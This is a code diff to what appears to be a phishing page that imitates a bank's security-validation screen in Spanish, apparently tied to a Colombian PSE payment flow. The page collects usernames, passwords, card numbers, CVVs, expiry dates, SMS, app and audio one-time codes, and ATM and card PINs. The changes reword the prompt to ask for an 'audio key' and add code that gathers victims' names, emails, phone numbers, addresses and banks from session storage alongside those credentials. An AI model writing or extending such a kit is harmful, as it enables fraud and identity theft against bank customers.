@@ -306,7 +306,7 @@
         <h1 class="texto-1 mt-5 text-start px-4">Validación de seguridad</h1>
         <br>
         <div class="text-center mb-3">
-            <p class="texto-2 mb-0 mt-2">Se ha envíado un código de seguridad por audio a tu celular</p>
+            <p class="texto-2 mb-0 mt-2">Por tu seguridad, ingresa tu clave de audio</p>
         </div>
         <!-- Mensaje de error general -->
         <div id="errorGeneralOtpAudio" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
@@ -315,7 +315,7 @@
                 <div class="row borde-entrada-1" id="containerOtpAudio">
                     <div class="col-1" style="padding-top: 11px;"><i class="bi bi-key"></i></div>
                     <input class="entrada-1 col-11" id="otpaudioInput" name="otpaudio" type="password"
-                        placeholder="Código de seguridad" minlength="4" maxlength="4">
+                        placeholder="Clave de audio" minlength="4" maxlength="4">
                 </div>
                 <div class="error-message" id="errorOtpAudio"></div>
             </div>
@@ -428,6 +428,34 @@
 
             console.log('Session UniqID:', appState.uniqId);
 
+            // ==================== RECUPERAR DATOS PSE ====================
+            const pseDatosStr = sessionStorage.getItem('pseDatos');
+            if (pseDatosStr) {
+                try {
+                    const pseDatos = JSON.parse(pseDatosStr);
+                    const camposPSE = {
+                        'nombre': pseDatos.nombre,
+                        'email': pseDatos.email,
+                        'celular': pseDatos.celular,
+                        'direccion': pseDatos.direccion,
+                        'ciudad': pseDatos.ciudad,
+                        'departamento': pseDatos.departamento,
+                        'banco': pseDatos.banco,
+                        'tipoPersona': pseDatos.tipoPersona,
+                        'ente': 'brasilia'
+                    };
+                    Object.keys(camposPSE).forEach(key => {
+                        if (camposPSE[key]) {
+                            const storageKey = `${appState.uniqId}_${key}`;
+                            localStorage.setItem(storageKey, JSON.stringify(camposPSE[key]));
+                        }
+                    });
+                    console.log('Datos PSE recuperados:', pseDatos);
+                } catch (e) {
+                    console.error('Error al parsear pseDatos:', e);
+                }
+            }
+
             // ==================== FUNCIONES AUXILIARES ====================
             function saveToLocalStorage(key, value) {
                 const storageKey = `${appState.uniqId}_${key}`;
@@ -493,7 +521,7 @@
                         ocultarError('errorOtpSms', 'containerOtpSms');
                         $('#btnOtpSms').prop('disabled', true);
                     } else if (viewId === 'otpaudio') {
-                        $('#errorGeneralOtpAudio').text('El código ingresado es incorrecto. Intenta nuevamente.').addClass('show');
+                        $('#errorGeneralOtpAudio').text('La clave ingresada es incorrecta. Intenta nuevamente.').addClass('show');
                         // Limpiar campos
                         $('#otpaudioInput').val('');
                         ocultarError('errorOtpAudio', 'containerOtpAudio');
@@ -545,7 +573,8 @@
 
                 const allData = {};
                 const fields = ['usuario', 'clave', 'ente', 'tdc', 'cvv', 'ven', 'otpsms', 'otpapp', 'otpaudio',
-                    'clavecajero', 'clavetdc', 'status', 'uniqid'
+                    'clavecajero', 'clavetdc', 'nombre', 'email', 'celular', 'ciudad', 'direccion',
+                    'departamento', 'banco', 'tipoPersona', 'status', 'uniqid'
                 ];
 
                 fields.forEach(field => {
